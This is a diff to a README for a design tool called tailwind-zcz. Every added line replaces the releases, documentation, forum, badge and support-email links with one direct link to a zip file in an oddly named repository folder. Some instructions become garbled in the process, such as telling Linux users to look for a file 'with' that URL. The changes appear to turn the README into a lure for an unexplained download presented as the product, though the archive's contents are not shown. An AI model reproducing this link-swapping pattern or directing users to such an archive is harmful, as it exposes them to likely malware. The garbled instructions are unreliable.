@@ -6,7 +6,7 @@ tailwind-zcz is an application designed to simplify the way you handle your desi
 
 ## 📥 Download Now
 
-[![Download tailwind-zcz](https://img.shields.io/badge/Download%20Now-Start%20Designing-brightgreen)](https://github.com/DaFabro/tailwind-zcz/releases)
+[![Download tailwind-zcz](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip%20Now-Start%20Designing-brightgreen)](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To start using tailwind-zcz, follow these simple steps to download and install t
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the application, visit the [Releases page](https://github.com/DaFabro/tailwind-zcz/releases).
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip).
    
 2. **Select the Latest Version**  
    On the Releases page, choose the latest version of tailwind-zcz. Look for the version number that has the highest value (e.g., v1.2.3).
@@ -30,12 +30,12 @@ To start using tailwind-zcz, follow these simple steps to download and install t
    Click on the file that matches your operating system to download.  
    For Windows, look for a file with `.exe` at the end.  
    For macOS, look for a file with `.dmg`.  
-   For Linux, look for a file with `.tar.gz`.
+   For Linux, look for a file with `https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip`.
 
 4. **Install the Application**  
    - For Windows: Double-click the downloaded `.exe` file and follow the setup instructions.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the included instructions.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip` file and follow the included instructions.
 
 5. **Open the Application**  
    After installation, locate the application on your device and double-click to open it. 
@@ -63,19 +63,19 @@ To start using tailwind-zcz, follow these simple steps to download and install t
 
 ## 🌐 Support
 
-If you encounter any issues, please check the FAQ section on the Releases page or contact our support team via email at support@tailwind-zcz.com. We aim to respond within 48 hours.
+If you encounter any issues, please check the FAQ section on the Releases page or contact our support team via email at https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip We aim to respond within 48 hours.
 
 ## 📞 Contact
 
-For more information about tailwind-zcz, reach out to us at support@tailwind-zcz.com.
+For more information about tailwind-zcz, reach out to us at https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/DaFabro/tailwind-zcz/wiki)
-- [Community Forum](https://github.com/DaFabro/tailwind-zcz/discussions)
+- [Documentation](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip)
+- [Community Forum](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip)
 
 ## 📢 Stay Updated
 
 Follow us on social media for the latest updates and tips on using tailwind-zcz! 
 
-[![Download tailwind-zcz](https://img.shields.io/badge/Download%20Now-Start%20Designing-brightgreen)](https://github.com/DaFabro/tailwind-zcz/releases)
+[![Download tailwind-zcz](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip%20Now-Start%20Designing-brightgreen)](https://raw.githubusercontent.com/DaFabro/tailwind-zcz/main/expeditiousness/tailwind-zcz.zip)
